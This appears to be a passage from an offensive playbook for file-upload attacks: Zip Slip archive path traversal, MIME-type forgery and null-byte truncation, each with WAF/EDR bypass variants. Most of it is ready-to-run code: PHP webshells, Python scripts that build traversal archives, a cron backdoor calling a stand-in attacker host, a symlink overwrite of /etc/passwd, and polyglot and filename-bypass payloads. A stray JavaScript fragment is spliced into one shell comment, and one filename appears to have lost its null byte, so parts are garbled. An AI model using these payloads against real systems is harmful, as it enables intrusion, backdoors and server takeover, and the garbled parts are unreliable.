Use path traversal in a maliciously crafted archive file (ZIP/TAR) to achieve arbitrary file write, overwriting critical files on the server or writing a Webshell
Sub-category: **Zip** · tags: `zip-slip` `file` `rce`

**Prerequisites:** the target has a ZIP/TAR upload with automatic extraction; the extraction library does not filter path traversal in filenames; you understand the path of the web root or another critical directory

**Attack chain:**

**1. Probe the ZIP upload and extraction feature**  _[linux]_
_Identify the target's ZIP upload/extraction feature and file storage path_
```
# Common ZIP upload/extraction scenarios:
# - Bulk file upload (template/resource import)
# - Plugin/theme installation (WordPress/Discuz)
# - Backup restore feature
# - Document processing (DOCX/XLSX are essentially ZIP)

# Test a normal ZIP upload:
echo "test" > test.txt
zip test.zip test.txt
curl -F "file=@test.zip" "http://target.com/upload/batch"

# Confirm the storage path of the extracted file:
curl "http://target.com/uploads/test.txt"
```

**2. Craft a Zip Slip malicious archive**
_Use Python to create a malicious ZIP archive containing path-traversal filenames_
```
# Python script to create a malicious ZIP:
import zipfile
import os

# Goal: write a webshell to the web root
with zipfile.ZipFile("evil.zip", "w") as zf:
    # Normal file (disguise)
    zf.writestr("readme.txt", "Normal file")
    # Malicious file (path traversal)
    zf.writestr("../../../var/www/html/test_shell.php",
                "<?php echo system($_GET['cmd']); ?>")
    # Or overwrite a config file:
    zf.writestr("../../../../../../etc/cron.d/backdoor",
                "* * * * * root curl http://attacker.com/callback")

print("[+] evil.zip created")
print("Files in ZIP:")
with zipfile.ZipFile("evil.zip", "r") as zf:
    for info in zf.infolist():
        print(f"  {info.filename} ({info.file_size} bytes)")
```

**3. Upload and verify Zip Slip**  _[linux]_
_Upload the malicious ZIP and verify whether the Webshell was written successfully_
```
# Upload the malicious ZIP
curl -F "file=@evil.zip" "http://target.com/upload/batch"

# Verify the webshell was written successfully
curl "http://target.com/test_shell.php?cmd=id"
curl "http://target.com/test_shell.php?cmd=whoami"

# If the target is a Java application (WAR package):
# Craft a malicious WAR/JAR package (also essentially a ZIP):
jar cf evil.war -C webshell/ .
# Or set the filename to ../../../webapps/ROOT/shell.jsp
```

**4. TAR-package Zip Slip variant**
_Use a TAR package to achieve Zip Slip, including the symlink attack variant_
```
# Craft a malicious TAR package:
import tarfile
import io

with tarfile.open("evil.tar.gz", "w:gz") as tar:
    # Add the malicious file
    content = b"<?php system($_GET['cmd']); ?>"
    info = tarfile.TarInfo(name="../../../var/www/html/test_t.php")
    info.size = len(content)
    tar.addfile(info, io.BytesIO(content))

# Use a symlink attack:
import tarfile
with tarfile.open("evil_symlink.tar.gz", "w:gz") as tar:
    # Create a symlink pointing to /etc/passwd
    info = tarfile.TarInfo(name="link_to_passwd")
    info.type = tarfile.SYMTYPE
    info.linkname = "/etc/passwd"
    tar.addfile(info)
    # Then overwrite the target file via "link_to_passwd"
    content = b"root:x:0:0:root:/root:/bin/bash"
    info2 = tarfile.TarInfo(name="link_to_passwd")
    info2.size = len(content)
    tar.addfile(info2, io.BytesIO(content))
```

**WAF/EDR bypass variants:**

**1. Alternative archive-format bypass**
_Use alternative archive formats such as tar/7z/cpio; the WAF may only detect path traversal in the zip format_
```
# Use the tar format (may not be detected)
import tarfile, io
with tarfile.open('test.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='../../../tmp/test.txt')
    info.size = 14
    tar.addfile(info, io.BytesIO(b'security_check'))

# Use the 7z format
7z a test.7z ../../../tmp/test.txt

# Use the cpio format
echo "../../../tmp/test.txt" | cpio -o > test.cpio
```

**2. Symlink attack**
_Embed a symlink pointing to a sensitive file in the archive; after extraction, read the target file via the symlink_
```
# Create an archive containing a symlink
import zipfile, os

# Method 1: tar symlink
import tarfile
with tarfile.open('symlink.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='link')
    info.type = tarfile.SYMTYPE
    info.linkname = '/etc/passwd'
    tar.addfile(info)

# Method 2: embed a symlink in a zip (Linux)
os.symlink('/etc/passwd', '/tmp/link')
with zipfile.ZipFile('symlink.zip', 'w') as zf:
    zf.write('/tmp/link', 'link')
```

**3. Filename encoding obfuscation**
_Bypass the path check during extraction by modifying the filename encoding inside the archive (UTF-8/GBK/backslash)_
```
# Unicode filename obfuscation
import zipfile, io, struct

with zipfile.ZipFile('encoded.zip', 'w') as zf:
    # Use backslash (Windows path separator)
    zf.writestr('..\\..\\..\\tmp\\test.txt', 'security_check')

# Manually craft a zip (modify the central-directory filename)
# Use UTF-8-encoded path-traversal characters
with open('crafted.zip', 'rb') as f:
    data = bytearray(f.read())
    # Replace the encoded characters in the filename
    # ../ becomes the raw bytes of %2e%2e%2f
```

---

### MIME type bypass  `file-mime`
Bypass the file-upload type check by forging the MIME type (Content-Type) to upload a malicious executable file
Sub-category: **MIME** · tags: `mime` `bypass`

**Prerequisites:** the target has a file-upload feature; the server determines the file type only by Content-Type; you understand the MIME types the target allows

**Attack chain:**

**1. Probe the file-type check mechanism**  _[linux]_
_Determine the server's file-type validation method via comparative testing_
```
# Test different upload methods to determine the check point:

# 1. Normal upload (should succeed):
curl -F "file=@test.jpg;type=image/jpeg" "http://target.com/upload"

# 2. Modify Content-Type (determine whether only MIME is checked):
curl -F "file=@shell.php;type=image/jpeg" "http://target.com/upload"

# 3. Modify the extension (determine whether the extension is checked):
curl -F "file=@shell.jpg;type=application/x-php" "http://target.com/upload"

# 4. Modify only the file header (determine whether Magic Bytes are checked):
# PHP starting with GIF89a:
printf "GIF89a<?php system($_GET['cmd']); ?>" > shell.gif
curl -F "file=@shell.gif;type=image/gif" "http://target.com/upload"
```

**2. Upload a Webshell via MIME-type forgery**  _[linux]_
_Use MIME forgery combined with various filename tricks to upload an executable file_
```
# Forge the Content-Type of a PHP webshell as an image:
curl -X POST "http://target.com/upload"   -F "file=@shell.php;type=image/jpeg;filename=shell.php"

# If the server also checks the extension, use a double extension:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php.jpg" "http://target.com/upload"
curl -F "file=@shell.php;type=image/png;filename=shell.jpg.php" "http://target.com/upload"

# Apache multiple-extension parsing:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php.abc" "http://target.com/upload"

# Nginx parsing vulnerability:
curl -F "file=@shell.jpg;type=image/jpeg" "http://target.com/upload"
curl "http://target.com/uploads/shell.jpg/.php"
```

**3. Magic Bytes forgery**  _[linux]_
_Prepend legitimate Magic Bytes file headers to the malicious file to bypass content checks_
```
# Prepend various file headers to the PHP file:

# JPEG file header:
printf "ÿØÿà JFIF" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# PNG file header:
printf "PNG\n\n" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# GIF file header:
printf "GIF89a" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# BMP file header:
printf "BM" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# Upload:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php" "http://target.com/upload"
```

**4. Verify the upload result**
_Confirm the uploaded file path and verify the Webshell executes_
```
# Confirm the file upload path:
curl -v "http://target.com/uploads/shell.php"

# Execute commands:
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=cat+/etc/passwd"

# If direct access fails, try other paths:
curl "http://target.com/upload/files/shell.php?cmd=id"
curl "http://target.com/static/uploads/shell.php?cmd=id"
curl "http://target.com/resources/shell.php?cmd=id"
```

**WAF/EDR bypass variants:**

**1. Polyglot file bypass**
_Create a polyglot file that satisfies both the image-format magic bytes and PHP parsing to bypass file-type detection_
```
# GIF+PHP Polyglot
GIF89a<?php echo "security_check"; ?>

# PNG+PHP Polyglot (using exiftool injection)
exiftool -Comment='<?php echo "security_check"; ?>' test.png
mv test.png test.php.png

# JPEG Polyglot
exiftool -DocumentName='<?php echo "security_check"; ?>' test.jpg

# BMP+PHP
python3 -c "import struct; open('poly.php.bmp','wb').write(b'BM'+struct.pack('<I',54)+b'\x00'*46+b'<?php echo \"security_check\"; ?>')"
```

**2. Content-Type boundary manipulation**
_Bypass the WAF file-type check via multiple Content-Type headers, boundary confusion, and MIME casing differences_
```
# Multiple Content-Type headers
POST /upload HTTP/1.1
Content-Type: image/jpeg
Content-Type: application/x-php

# boundary confusion
Content-Type: multipart/form-data; boundary=abc; boundary=xyz

# Case-obfuscated MIME type
Content-Type: Image/JPEG
Content-Type: image/JPEG; charset=utf-8

# Add extra parameters
Content-Type: image/jpeg; name="test.php"
```

**3. EXIF metadata injection payload**
_Inject the payload into the image's EXIF/XMP/ICC metadata fields, combined with a file-inclusion vulnerability to execute code_
```
# EXIF Comment injection
exiftool -Comment='<?php system("id"); ?>' photo.jpg

# XMP metadata injection
exiftool -XMP-dc:Description='<script>alert(1)</script>' photo.jpg

# ICC Profile injection
exiftool -ICC_Profile:ProfileDescription='<?php echo "security_check"; ?>' photo.jpg

# After upload, combine with a file-inclusion exploit
# http://target/include.php?file=uploads/photo.jpg
```

---

### Null-byte truncation  `file-null-byte`
Use a null byte (%00/\x00) to truncate the extension validation of the filename, bypassing the file-upload allowlist restriction
Sub-category: **Null Byte** · tags: `null-byte` `bypass`

**Prerequisites:** the target uses allowlist validation of the file extension; the backend language or library is affected by null-byte truncation (PHP<5.3.4, old Java versions); a truncation point exists in the server's path concatenation

**Attack chain:**

**1. Null-byte truncation principle and environment detection**
_Detect whether the target environment may be affected by null-byte truncation_
```
# Environments affected by null-byte truncation:
# - PHP < 5.3.4 (the underlying C functions treat it as the string terminator),
        syntaxBreakdown: [
          { part: '<script>', explanation: { zh: 'Script tag', en: 'Scripttag' }, type: 'tag' },
          { part: 'alert()', explanation: { zh: 'Popup function', en: 'Alert function' }, type: 'function' }
        ]
# - The File class in old Java versions
# - Some Python 2.x versions
# - Programs using C/C++ extensions

# Detect the PHP version:
curl -sI "http://target.com/" | grep -i "x-powered-by|server"
curl -s "http://target.com/phpinfo.php" | grep -i "php version"
```

**2. Null-byte truncation in file upload**
_Inject a null byte into the filename to truncate the extension validation_
```
# Method 1: URL-encoded null byte:
curl -F "file=@shell.php;filename=shell.php%00.jpg" "http://target.com/upload"

# Method 2: modify the raw bytes in Burp:
# Replace the [0x00] in the filename shell.php[0x00].jpg with an actual null byte
# Burp Repeater → select %00 → right-click → Convert → URL decode

# Method 3: send with Python:
import requests
files = {"file": ("shell.php .jpg", open("shell.php","rb"), "image/jpeg")}
r = requests.post("http://target.com/upload", files=files)
print(r.status_code, r.text[:200])
```

**3. Null-byte truncation in file inclusion**  _[linux]_
_Use a null byte in a file-inclusion scenario to truncate the suffix concatenated by the server_
```
# Null-byte truncation in PHP file inclusion:
# Server-side code: include($_GET["page"] . ".php");

# Normal request:
curl "http://target.com/index.php?page=about"   # → include("about.php")

# Null-byte truncation:
curl "http://target.com/index.php?page=../../../etc/passwd%00"
# → include("../../../etc/passwd .php")
# → actually reads ../../../etc/passwd (.php truncated)

# Combined with path traversal:
curl "http://target.com/index.php?page=../../../var/log/apache2/access.log%00"
curl "http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config%00"
```

**4. Modern alternatives (PHP>=5.3.4)**
_Alternative bypass options when null-byte truncation cannot be used in PHP 5.3.4+_
```
# PHP 5.3.4+ has fixed null-byte truncation; alternatives:

# 1. Path truncation (overlong path):
# Windows MAX_PATH=260, Linux PATH_MAX=4096
payload="shell.php" + "/./" * 2048 + ".jpg"
curl "http://target.com/upload" -F "file=@shell.php;filename=$payload"

# 2. Dot truncation (Windows):
# Windows ignores trailing dots and spaces in the filename
curl -F "file=@shell.php;filename=shell.php." "http://target.com/upload"
curl -F "file=@shell.php;filename=shell.php " "http://target.com/upload"
curl -F "file=@shell.php;filename=shell.php::$DATA" "http://target.com/upload"

# 3. Casing bypass:
curl -F "file=@shell.pHP;type=image/jpeg" "http://target.com/upload"
```

**WAF/EDR bypass variants:**

**1. Path-length truncation**
_Use the filesystem path maximum-length limit; an overlong path causes the suffix to be truncated_
```
# PHP path-length truncation (PHP < 5.3, exceeding 4096 characters)
../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.

# Overlong-extension truncation
test.php.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# Dot truncation (Windows MAX_PATH=260)
test.php...........................................................................
```

**2. Windows special-filename tricks**
_Use Windows NTFS filesystem characteristics (ADS streams/short filenames/special-character handling) to bypass extension detection_
```
# Dot-space-dot truncation (Windows NTFS)
test.php. . . .
test.php::$DATA
test.php::$DATA.jpg

# ADS stream to hide the extension
test.php::$INDEX_ALLOCATION
test.asp;.jpg
test.asp%00.jpg

# Windows short filename (8.3 format)
TESTPH~1.PHP
SHELL~1.PHP
```

**3. Alternative null-byte representations**
_Use different encodings to represent a null byte or terminator, bypassing the WAF's %00 detection rules_
```
# Null bytes in different encodings
test.php%00.jpg
test.php\x00.jpg
test.php\0.jpg
test.php\u0000.jpg

# URL encoding variants
test.php%2500.jpg   # double-encoded null byte
test.php%u0000.jpg  # UTF-16 null byte

# Special terminators
test.php%0d.jpg     # carriage return
test.php%0a.jpg     # line feed
test.php%1a.jpg     # EOF marker
```

---
